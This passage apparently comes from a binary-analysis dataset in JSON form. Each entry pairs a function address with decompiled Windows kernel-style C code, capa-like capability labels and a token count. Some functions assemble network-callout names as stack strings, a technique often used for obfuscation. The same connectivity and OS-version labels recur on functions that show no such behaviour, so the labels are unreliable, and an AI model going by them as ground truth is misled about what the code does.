var_2c8h = &var_2c4h;\n            do {\n                cVar1 = *var_2c8h;\n                var_2c8h = var_2c8h + 1;\n            } while (cVar1 != '\\0');\n            var_290h = fcn.000789ae(var_50h, &var_280h, 0, 1, &var_2c4h, var_2c8h + (1 - (&var_2c4h + 1)));\n            if (var_290h == 0) {\n                fcn.000789c0(&var_280h, &var_2a0h);\n                var_2d8h = &var_18h;\n                do {\n                    cVar1 = *var_2d8h;\n                    var_2d8h = var_2d8h + 1;\n                } while (cVar1 != '\\0');\n                var_290h = fcn.000789ae(var_50h, &var_280h, 0, 1, &var_18h, var_2d8h + (1 - (&var_18h + 1)));\n                if (var_290h == 0) {\n                    fcn.000789c0(&var_280h, &var_4ch);\n                    var_290h = fcn.000789ae(var_50h, &var_280h, 0, 4, &var_28ch, 4);\n                    if (var_290h == 0) {\n                        fcn.000789c0(&var_280h, &var_278h);\n                        var_290h = fcn.000789ae(var_50h, &var_280h, 0, 4, &var_5ch, 4);\n                    }\n                }\n            }\n        }\n        if (var_290h != 0) {\n            fcn.000789ea(var_288h);\n        }\n        fcn.000789b4(var_288h);\n        if (var_50h != 0) {\n            fcn.000789b4(var_50h);\n        }\n    }\n    return var_290h;\n}\n",
        "token_count": 1768
    },
    "00042d30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00042d30(void)\n\n{\n    int32_t var_23ch;\n    uint var_238h;\n    uint var_234h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_220h;\n    int32_t var_21ch;\n    uint var_218h;\n    uint var_214h;\n    uint *var_210h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint var_200h;\n    \n    var_21ch = 0;\n    var_22ch = 1;\n    var_238h = 2;\n    fcn.000789c6(&var_200h, 0x100, 0x80051768, 0x800cb870, 0x800cb778);\n    fcn.000789c0(&var_228h, &var_200h);\n    var_218h = 0x18;\n    var_214h = 0;\n    var_20ch = 0x40;\n    var_210h = &var_228h;\n    var_208h = 0;\n    var_204h = 0;\n    var_23ch = fcn.00078a9e(&var_220h, 0xf003f, &var_218h, 0, 0, 0, &var_238h);\n    if (var_23ch == 0) {\n        fcn.000789c6(&var_200h, 0x100, 0x80055104, 0x800cb870, 0x800cb778, 0x80055198);\n        fcn.000789c0(&var_228h, &var_200h);\n        var_218h = 0x18;\n        var_214h = 0;\n        var_20ch = 0x40;\n        var_210h = &var_228h;\n        var_208h = 0;\n        var_204h = 0;\n        var_23ch = fcn.00078a9e(&var_21ch, 0xf003f, &var_218h, 0, 0, 0, &var_238h);\n        if (var_23ch == 0) {\n            fcn.000789c0(&var_234h, 0x800551b0);\n            var_23ch = fcn.000789ae(var_21ch, &var_234h, 0, 4, &var_22ch, 4);\n        }\n        if (var_23ch != 0) {\n            fcn.000789ea(var_220h);\n        }\n        fcn.000789b4(var_220h);\n        if (var_21ch != 0) {\n            fcn.000789b4(var_21ch);\n        }\n    }\n    return var_23ch;\n}\n",
        "token_count": 650
    },
    "000432d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000432d0(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint var_120h;\n    uint var_11ch;\n    uint var_cch;\n    int32_t var_c8h;\n    int32_t var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    int32_t var_a0h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    if ((arg_8h == NULL) || (arg_8h[6] == 0)) {\n        var_c8h = 0x21590065;\n    }\n    else {\n        puVar2 = arg_8h;\n        puVar3 = &var_b8h;\n        for (iVar1 = 0x2a; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar3 = *puVar2;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n        var_cch = *(var_a0h + 0x14);\n        var_c8h = fcn.00043930(arg_8h, 0, &var_cch, &var_120h, &var_8h);\n        if (var_c8h == 0) {\n            *0x800db720 = fcn.00042060(var_8h, 0x150, &var_120h, 0x50);\n            if (*0x800db720 != -1) {\n                *0x800db724 = *0x800db720 + 4;\n                *0x800db728 = *0x800db720 + 5;\n                *0x800db72c = *0x800db720 + 8;\n            }\n            *0x800db730 = fcn.0003e360(var_8h, 0x100, 0x80083ab0);\n            if (*0x800db730 == -1) {\n                var_c8h = 0x21590005;\n            }\n            else {\n                *0x800db734 = fcn.0003e360(var_8h, 0x100, 0x80083ad0);\n                if (*0x800db734 == -1) {\n                    var_c8h = 0x21590005;\n                }\n                else {\n                    *0x800db738 = fcn.0003e360(var_8h, 0x100, 0x80083a90);\n                    if (*0x800db738 == -1) {\n                        var_c8h = 0x21590005;\n                    }\n                    else {\n                        *0x800db73c = fcn.0003e360(var_8h, 0x100, 0x80083af0);\n                        if (*0x800db73c == -1) {\n                            var_c8h = 0x21590005;\n                        }\n                        else {\n                            *0x800db740 = fcn.0003e360(var_8h, 0x100, 0x80083b10);\n                            if (*0x800db740 == -1) {\n                                var_c8h = 0x21590005;\n                            }\n                            else {\n                                *0x800db744 = fcn.0003e360(var_8h, 0x100, 0x80083c50);\n                                if (*0x800db744 == -1) {\n                                    var_c8h = 0x21590005;\n                                }\n                                else {\n                                    *0x800db748 = fcn.0003e360(var_8h, 0x100, 0x80083b30);\n                                    if (*0x800db748 == -1) {\n                                        var_c8h = 0x21590005;\n                                    }\n                                    else {\n                                        *0x800db74c = fcn.0003e360(var_8h, 0x100, 0x80083b50);\n                                        if (*0x800db74c == -1) {\n                                            var_c8h = 0x21590005;\n                                        }\n                                        else {\n                                            *0x800db750 = fcn.0003e360(var_8h, 0x100, 0x80083b70);\n                                            if (*0x800db750 == -1) {\n                                                var_c8h = 0x21590005;\n                                            }\n                                            else {\n                                                *0x800db754 = fcn.0003e360(var_8h, 0x100, 0x80083b90);\n                                                if (*0x800db754 == -1) {\n                                                    var_c8h = 0x21590005;\n                                                }\n                                                else {\n                                                    *0x800db758 = fcn.0003e360(var_8h, 0x100, 0x80083bb0);\n                                                    if (*0x800db758 == -1) {\n                                                        var_c8h = 0x21590005;\n                                                    }\n                                                    else {\n                                                        *0x800db75c = fcn.0003e360(var_8h, 0x100, 0x80083bd0);\n                                                        if (*0x800db75c == -1) {\n                                                            var_c8h = 0x21590005;\n                                                        }\n                                                        else {\n                                                            *0x800db760 = fcn.0003e360(var_8h, 0x100, 0x80083bf0);\n                                                            if (*0x800db760 == -1) {\n                                                                var_c8h = 0x21590005;\n                                                            }\n                                                            else {\n                                                                *0x800db764 = fcn.0003e360(var_8h, 0x100, 0x80083c10);\n                                                                if (*0x800db764 == -1) {\n                                                                    var_c8h = 0x21590005;\n                                                                }\n                                                                else {\n                                                                    *0x800db768 = fcn.0003e360(var_8h, 0x100, 0x80083c30\n                                                                                              );\n                                                                    if (*0x800db768 == -1) {\n                                                                        var_c8h = 0x21590005;\n                                                                    }\n                                                                    else {\n                                                                        *0x800db76c = fcn.0003e360(var_8h, 0x100, \n                                                                                                   &var_cch);\n                                                                        if (*0x800db76c == -1) {\n                                                                            var_c8h = 0x21590005;\n                                                                        }\n                                                                        else {\n                                                                            fcn.0001ae20(2, &var_10h, &var_c0h);\n                                                                            var_ch = var_8h;\n                                                                            do {\n                                                                                iVar1 = fcn.00043780(var_ch, &var_c4h, \n                                                                                                     &var_bch);\n                                                                                if (((iVar1 == 0) && (var_c4h == 6)) &&\n                                                                                   (var_ch != var_8h)) {\n                                                                                    fcn.0003b210(var_ch, var_bch);\n                                                                                }\n                                                                                var_ch = *(var_ch + 4);\n                                                                                var_4h = var_ch;\n                                                                            } while (var_ch != 0);\n                                                                            fcn.0001af70(var_10h, var_c0h);\n                                                                        }\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n            (**0x800db880)(var_8h);\n            *(var_a0h + 0x14) = var_cch;\n            puVar2 = &var_b8h;\n            for (iVar1 = 0x2a; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *arg_8h = *puVar2;\n                puVar2 = puVar2 + 1;\n                arg_8h = arg_8h + 1;\n            }\n        }\n    }\n    return var_c8h;\n}\n",
        "token_count": 1794
    },
    "00043780": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00043780(int32_t arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    char *pcVar3;\n    uint32_t *puVar4;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = arg_8h + *0x800db728;\n    pcVar3 = arg_8h + *0x800db724;\n    puVar4 = arg_8h + *0x800db72c;\n    cVar1 = (**0x80051214)(pcVar2);\n    if ((((cVar1 != '\\0') && (cVar1 = (**0x80051214)(pcVar3),  cVar1 != '\\0')) && (*pcVar3 == '\\x06')) &&\n       (((*pcVar2 == '\\0' || (*pcVar2 == '\\x01')) || ((*pcVar2 == '\\x02' || (*pcVar2 == '\\x14')))))) {\n        if ((*puVar4 & 1) != 0) {\n            return 0xffffffff;\n        }\n        *arg_ch = *pcVar3;\n        *arg_10h = *pcVar2;\n        return 0;\n    }\n    pcVar2 = arg_8h + *0x800db628;\n    pcVar3 = arg_8h + *0x800db624;\n    cVar1 = (**0x80051214)(pcVar2);\n    if (((cVar1 != '\\0') && (cVar1 = (**0x80051214)(pcVar3),  cVar1 != '\\0')) &&\n       ((*pcVar3 == '\\x05' && (((*pcVar2 == '\\0' || (*pcVar2 == '\\x01')) || (*pcVar2 == '\\x02')))))) {\n        *arg_ch = *pcVar3;\n        *arg_10h = *pcVar2;\n        return 0;\n    }\n    cVar1 = (**0x80051214)(pcVar2);\n    if (((cVar1 != '\\0') && (cVar1 = (**0x80051214)(pcVar3),  cVar1 != '\\0')) &&\n       ((*pcVar3 == '\\x04' && (*pcVar2 == '\\0')))) {\n        *arg_ch = *pcVar3;\n        *arg_10h = 0;\n        return 0;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 563
    },
    "00043930": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00043930(uint arg_8h, uint noname_1, uint arg_10h, uchar *arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = (**0x80051028)();\n    fcn.000789c0(&var_10h, 0x80054764);\n    fcn.00078bfa(arg_14h, 0, 0x50);\n    *arg_14h = 0x8a;\n    if ((var_4h & 0xffff) == 0) {\n        arg_14h[1] = 1;\n        *(arg_14h + 2) = 0x48;\n    }\n    else {\n        arg_14h[1] = 2;\n        *(arg_14h + 2) = 0x50;\n        *(arg_14h + 0x48) = 0x80083c70;\n        *(arg_14h + 0x4c) = 0x80083c90;\n    }\n    arg_14h[4] = 6;\n    arg_14h[5] = var_4h;\n    arg_14h[6] = 6;\n    arg_14h[7] = 0;\n    *(arg_14h + 0xc) = 0x80083ab0;\n    *(arg_14h + 0x10) = 0x80083ad0;\n    *(arg_14h + 0x14) = 0x80083a90;\n    *(arg_14h + 0x18) = 0x80083af0;\n    *(arg_14h + 0x1c) = 0x80083b10;\n    *(arg_14h + 0x20) = 0x80083c50;\n    *(arg_14h + 0x24) = 0x80083b30;\n    *(arg_14h + 0x28) = 0x80083b50;\n    *(arg_14h + 0x2c) = 0x80083b70;\n    *(arg_14h + 0x30) = 0x80083b90;\n    *(arg_14h + 0x3c) = 0x80083bb0;\n    *(arg_14h + 0x40) = 0x80083bd0;\n    *(arg_14h + 0x34) = 0x80083bf0;\n    *(arg_14h + 0x38) = 0x80083c10;\n    *(arg_14h + 0x44) = 0x80083c30;\n    uVar1 = (**0x800db868)(arg_8h, &var_10h, arg_10h, arg_14h, arg_18h);\n    return uVar1;\n}\n",
        "token_count": 675
    },
    "00043cf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00043cf0(void)\n\n{\n    int32_t iVar1;\n    uint var_114h;\n    int32_t *var_110h;\n    int32_t *var_10ch;\n    uint var_108h;\n    \n    var_110h = NULL;\n    iVar1 = fcn.000533b0(0x800ce908, 1, 1);\n    if (iVar1 == 1) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.00034cf0(5, &var_110h);\n        if (iVar1 == 0) {\n            var_10ch = var_110h;\n            while( true ) {\n                do {\n                    iVar1 = fcn.00036d60(var_10ch[0x11], &var_108h, 0x104);\n                } while (iVar1 == 0);\n                iVar1 = fcn.00078a92(&var_108h, 0x80051a14);\n                if (iVar1 == 0) {\n                    fcn.00043de0(var_10ch[0x11]);\n                }\n                if (*var_10ch == 0) break;\n                var_10ch = var_10ch + *var_10ch;\n            }\n            fcn.000357f0(var_110h);\n            iVar1 = 0;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 317
    },
    "00043de0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00043de0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    \n    iVar1 = fcn.000533b0(0x800ce908, 1, 1);\n    if ((iVar1 != 1) && (iVar1 = fcn.0001ace0(&var_8h, 0x80083e30, arg_8h),  iVar1 == 0)) {\n        fcn.00037710(&var_8h);\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "00043e30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00043e30(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    var_ch = arg_8h;\n    fcn.00043cb0(1000);\n    var_10h = fcn.000594b0(var_ch, 0x800551e8, &var_14h);\n    if (var_10h == 0) {\n        fcn.00059c90(var_ch, var_14h);\n        iVar1 = fcn.000533b0(0x800ce908, 1, 0);\n        if (iVar1 == 0) {\n            *0x800cd93c = var_ch;\n            var_10h = fcn.00038a30();\n            if ((var_10h == 0) && (var_10h = fcn.00038620(),  var_10h == 0)) {\n                fcn.00046b50();\n                *0x800ce87c = *0x800ce3c4;\n                fcn.000789c0(&var_8h, 0x800551f0);\n                var_10h = (**0x800511a0)(*0x800ce87c, 0, &var_8h, 0, 0, 0, 0x800ce8d4);\n                if (((var_10h == 0) &&\n                    (((var_10h = fcn.000441b0(),  var_10h == 0 && (var_10h = fcn.00044110(),  var_10h == 0)) &&\n                     (var_10h = fcn.00044250(),  var_10h == 0)))) && (var_10h = fcn.00043fa0(),  var_10h == 0)) {\n                    fcn.00046290();\n                }\n            }\n            if (var_10h != 0) {\n                fcn.00071080(0x800ce908, 0);\n            }\n        }\n        else {\n            var_10h = 0;\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 503
    },
    "00043f70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint fcn.00043f70(void)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    while( true ) {\n        iVar1 = fcn.000345a0(0x800ce914, 3);\n        if (iVar1 != 0) break;\n        fcn.00044250();\n    }\n    return 0;\n}\n",
        "token_count": 97
    },
    "00044010": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00044010(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x800ce90c != 0) {\n        fcn.00034570(0x800ce914);\n        iVar1 = fcn.000377c0(0x800ce90c);\n        if (iVar1 == 0) {\n            fcn.00078a62(*0x800ce90c, 0, 0);\n        }\n        *0x800ce90c = 0;\n        *0x800ce910 = 0;\n        fcn.00034540(0x800ce914);\n    }\n    return 0;\n}\n",
        "token_count": 145
    },
    "00044070": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00044070(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.000533b0(0x800ce908, 1, 1);\n    if (iVar1 == 1) {\n        if ((arg_8h != 0) && (arg_8h != *0x800cd93c)) {\n            iVar1 = fcn.000594b0(arg_8h, 0x800551e8, &var_4h);\n            if (iVar1 != 0) {\n                return;\n            }\n            fcn.00059c90(arg_8h, var_4h);\n        }\n        fcn.00071080(0x800ce908, 0);\n        fcn.00044010();\n        fcn.000462b0();\n        fcn.00044220();\n        fcn.00044160();\n        fcn.00046b80();\n        fcn.00044f30();\n        (**0x8005117c)(*0x800ce8d4);\n        *0x800cd93c = 0;\n    }\n    return;\n}\n",
        "token_count": 263
    },
    "00044110": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __fastcall fcn.00044110(uint param_1)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    *0x800ce8dc = (**0x800ce708)(*0x800ce87c, 0x6f6e6553, 0, param_1);\n    if (*0x800ce8dc == 0) {\n        uVar1 = 0xc0000017;\n    }\n    else {\n        uVar1 = (**0x800ce754)(2, 1, 0x800ce900);\n    }\n    return uVar1;\n}\n",
        "token_count": 150
    },
    "00044160": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00044160(void)\n\n{\n    if (*0x800ce900 != 0) {\n        (**0x800ce758)(*0x800ce900);\n        *0x800ce900 = 0;\n    }\n    if (*0x800ce8dc != 0) {\n        (**0x800ce70c)(*0x800ce8dc);\n        *0x800ce8dc = 0;\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "000441b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.000441b0(void)\n\n{\n    uint uVar1;\n    uint var_10h;\n    uint var_bh;\n    uint var_7h;\n    uint var_3h;\n    \n    var_bh._1_2_ = 0;\n    var_10h._0_1_ = 0x80;\n    stack0xffffffed = 0x1001;\n    var_bh._0_1_ = 1;\n    var_7h._3_1_ = 0;\n    var_3h._0_2_ = 0;\n    var_3h._2_1_ = 0;\n    stack0xfffffff4 = 0x706e6553;\n    *0x800ce904 = (**0x800ce710)(*0x800ce8dc, &var_10h);\n    if (*0x800ce904 == 0) {\n        uVar1 = 0xc0000017;\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 255
    },
    "00044220": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00044220(void)\n\n{\n    if (*0x800ce904 != 0) {\n        (**0x800ce714)(*0x800ce904);\n        *0x800ce904 = 0;\n    }\n    return;\n}\n",
        "token_count": 55
    },
    "00044250": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00044250(void)\n\n{\n    int16_t iVar1;\n    uint var_270h;\n    uint var_268h;\n    uint *var_264h;\n    uint var_260h;\n    uint var_258h;\n    uint *var_254h;\n    uint var_250h;\n    uint var_248h;\n    uint *var_244h;\n    uint var_240h;\n    uint var_238h;\n    uint *var_234h;\n    uint var_230h;\n    uint var_228h;\n    int16_t *var_224h;\n    uint var_220h;\n    uint var_218h;\n    int16_t *var_214h;\n    uint var_210h;\n    uint var_208h;\n    uint *var_204h;\n    uint var_200h;\n    uint var_1f8h;\n    uint *var_1f4h;\n    uint var_1f0h;\n    uint var_1e8h;\n    uint *var_1e4h;\n    uint var_1e0h;\n    uint var_1d8h;\n    uint *var_1d4h;\n    uint var_1d0h;\n    uint var_1c8h;\n    uint *var_1c4h;\n    uint var_1c0h;\n    uint var_1b8h;\n    uint *var_1b4h;\n    uint var_1b0h;\n    uint var_1a8h;\n    uint *var_1a4h;\n    uint var_1a0h;\n    uint var_198h;\n    uint *var_194h;\n    uint var_190h;\n    uint var_188h;\n    uint *var_184h;\n    uint var_180h;\n    uint var_178h;\n    uint *var_174h;\n    uint var_170h;\n    uint var_168h;\n    int16_t *var_164h;\n    uint var_160h;\n    uint var_158h;\n    int16_t *var_154h;\n    uint var_150h;\n    ushort var_14ch;\n    ushort var_14ah;\n    ushort var_148h;\n    ushort var_146h;\n    ushort var_144h;\n    ushort var_142h;\n    ushort var_140h;\n    ushort var_13eh;\n    ushort var_13ch;\n    ushort var_13ah;\n    ushort var_138h;\n    uint var_134h;\n    ushort var_130h;\n    ushort var_12eh;\n    ushort var_12ch;\n    ushort var_12ah;\n    ushort var_128h;\n    ushort var_126h;\n    ushort var_124h;\n    ushort var_122h;\n    ushort var_120h;\n    ushort var_11eh;\n    ushort var_11ch;\n    ushort var_11ah;\n    ushort var_118h;\n    ushort var_116h;\n    int32_t var_114h;\n    uint var_110h;\n    ushort var_10ch;\n    ushort var_10ah;\n    ushort var_108h;\n    ushort var_106h;\n    ushort var_104h;\n    ushort var_102h;\n    ushort var_100h;\n    ushort var_feh;\n    ushort var_fch;\n    ushort var_fah;\n    ushort var_f8h;\n    ushort var_f6h;\n    uint var_f1h;\n    ushort var_ech;\n    ushort var_eah;\n    ushort var_e8h;\n    ushort var_e6h;\n    ushort var_e4h;\n    ushort var_e2h;\n    ushort var_e0h;\n    ushort var_deh;\n    ushort var_dch;\n    ushort var_dah;\n    ushort var_d8h;\n    ushort var_d6h;\n    ushort var_d4h;\n    uint var_d0h;\n    ushort var_cch;\n    ushort var_cah;\n    ushort var_c8h;\n    ushort var_c6h;\n    ushort var_c4h;\n    ushort var_c2h;\n    ushort var_c0h;\n    ushort var_beh;\n    ushort var_bch;\n    ushort var_bah;\n    ushort var_b8h;\n    ushort var_b6h;\n    ushort var_b4h;\n    uint var_b0h;\n    ushort var_ach;\n    ushort var_aah;\n    ushort var_a8h;\n    ushort var_a6h;\n    ushort var_a4h;\n    ushort var_a2h;\n    ushort var_a0h;\n    ushort var_9eh;\n    ushort var_9ch;\n    ushort var_9ah;\n    ushort var_98h;\n    ushort var_96h;\n    ushort var_94h;\n    uint var_90h;\n    ushort var_8ch;\n    ushort var_8ah;\n    ushort var_88h;\n    ushort var_86h;\n    ushort var_84h;\n    ushort var_82h;\n    ushort var_80h;\n    ushort var_7eh;\n    ushort var_7ch;\n    ushort var_7ah;\n    ushort var_78h;\n    ushort var_76h;\n    ushort var_74h;\n    ushort var_72h;\n    uint var_6dh;\n    uint var_68h;\n    int32_t var_5ch;\n    uint var_54h;\n    uint var_3ch;\n    ushort var_38h;\n    ushort var_36h;\n    ushort var_34h;\n    ushort var_32h;\n    ushort var_30h;\n    ushort var_2eh;\n    ushort var_2ch;\n    ushort var_2ah;\n    ushort var_28h;\n    ushort var_26h;\n    ushort var_24h;\n    ushort var_22h;\n    int16_t var_20h [4];\n    ushort var_18h;\n    ushort var_16h;\n    ushort var_14h;\n    ushort var_12h;\n    ushort var_10h;\n    ushort var_eh;\n    ushort var_ch;\n    ushort var_ah;\n    ushort var_8h;\n    ushort var_6h;\n    ushort var_4h;\n    \n    var_114h = 0;\n    var_6dh._0_1_ = '\\0';\n    var_f1h._0_1_ = '\\0';\n    var_f1h._1_2_ = 0x72;\n    stack0xffffff0e = 0x6b;\n    var_ech = 0x6e;\n    var_eah = 0x67;\n    var_e8h = 0x5f;\n    var_e6h = 0x73;\n    var_e4h = 0x65;\n    var_e2h = 0x73;\n    var_e0h = 0x73;\n    var_deh = 0x69;\n    var_dch = 0x6f;\n    var_dah = 0x6e;\n    var_d8h = 0;\n    var_d6h = 0;\n    var_d4h = 0;\n    var_3ch._0_2_ = 0x73;\n    var_3ch._2_2_ = 0x74;\n    var_38h = 0x72;\n    var_36h = 0x65;\n    var_34h = 0x61;\n    var_32h = 0x6d;\n    var_30h = 0x5f;\n    var_2eh = 99;\n    var_2ch = 0x61;\n    var_2ah = 0x6f;\n    var_28h = 0x74;\n    var_26h = 0;\n    var_24h = 0;\n    var_22h = 0;\n    var_150h._0_2_ = 0x65;\n    var_150h._2_2_ = 0x73;\n    var_14ch = 0x74;\n    var_14ah = 0x62;\n    var_148h = 0x6c;\n    var_146h = 0x5f;\n    var_144h = 99;\n    var_142h = 0x61;\n    var_140h = 0x6f;\n    var_13eh = 0x74;\n    var_13ch = 0;\n    var_13ah = 0;\n    var_138h = 0;\n    var_90h._0_2_ = 0x73;\n    var_90h._2_2_ = 0x74;\n    var_8ch = 0x72;\n    var_8ah = 0x65;\n    var_88h = 0x61;\n    var_86h = 0x6d;\n    var_84h = 0x5f;\n    var_82h = 0x66;\n    var_80h = 0x69;\n    var_7eh = 0x6c;\n    var_7ch = 0x74;\n    var_7ah = 0x65;\n    var_78h = 0x72;\n    var_76h = 0;\n    var_74h = 0;\n    var_72h = 0;\n    var_b0h._0_2_ = 0x65;\n    var_b0h._2_2_ = 0x73;\n    var_ach = 0x74;\n    var_aah = 0x62;\n    var_a8h = 0x6c;\n    var_a6h = 0x5f;\n    var_a4h = 0x66;\n    var_a2h = 0x69;\n    var_a0h = 0x6c;\n    var_9eh = 0x74;\n    var_9ch = 0x65;\n    var_9ah = 0x72;\n    var_98h = 0;\n    var_96h = 0;\n    var_94h = 0;\n    var_110h._0_2_ = 0x61;\n    var_110h._2_2_ = 99;\n    var_10ch = 99;\n    var_10ah = 0x65;\n    var_108h = 0x70;\n    var_106h = 0x74;\n    var_104h = 0x5f;\n    var_102h = 99;\n    var_100h = 0x61;\n    var_feh = 0x6f;\n    var_fch = 0x74;\n    var_fah = 0;\n    var_f8h = 0;\n    var_f6h = 0;\n    var_20h[0] = 99;\n    var_20h[1] = 0x6f;\n    var_20h[2] = 0x6e;\n    var_20h[3] = 0x6e;\n    var_18h = 0x65;\n    var_16h = 99;\n    var_14h = 0x74;\n    var_12h = 0x5f;\n    var_10h = 99;\n    var_eh = 0x61;\n    var_ch = 0x6f;\n    var_ah = 0x74;\n    var_8h = 0;\n    var_6h = 0;\n    var_4h = 0;\n    var_d0h._0_2_ = 0x74;\n    var_d0h._2_2_ = 0x72;\n    var_cch = 0x61;\n    var_cah = 0x6e;\n    var_c8h = 0x73;\n    var_c6h = 0x69;\n    var_c4h = 0x6e;\n    var_c2h = 0x5f;\n    var_c0h = 99;\n    var_beh = 0x61;\n    var_bch = 0x6f;\n    var_bah = 0x74;\n    var_b8h = 0;\n    var_b6h = 0;\n    var_b4h = 0;\n    var_134h._0_2_ = 0x74;\n    var_134h._2_2_ = 0x72;\n    var_130h = 0x61;\n    var_12eh = 0x6e;\n    var_12ch = 0x73;\n    var_12ah = 0x6f;\n    var_128h = 0x75;\n    var_126h = 0x74;\n    var_124h = 0x5f;\n    var_122h = 99;\n    